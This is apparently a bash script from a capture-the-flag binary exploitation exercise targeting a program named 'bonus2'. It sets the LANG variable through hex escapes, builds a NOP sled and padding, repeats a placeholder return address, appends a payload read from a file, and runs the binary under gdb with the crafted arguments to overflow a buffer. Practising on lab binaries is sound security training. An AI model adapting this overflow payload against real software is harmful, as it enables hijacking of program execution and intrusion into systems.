#!/bin/bash
export LANG="`echo -ne '\x6e\x6c'`"


TARGET_EIP="ABCD"
TOTAL_PAYLOAD="`cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin`"


FIRST="`python -c 'import sys; sys.stdout.write("\x90" * 42);'`"
SECOND="`python -c 'import sys; sys.stdout.write("\xA0" * 200);'``python -c "import sys; sys.stdout.write(\\"$TARGET_EIP\\" * 40)"`$TOTAL_PAYLOAD`python -c 'import sys; sys.stdout.write("\xBA\xBA\xBA\xBA" * 123);'`"

echo '__hex_first='
echo "$FIRST" | hexdump -C
echo '__hex_second='
echo "$SECOND" | hexdump -C  

gdb -x gdb.script --args ./bonus2 "$FIRST" "$SECOND"
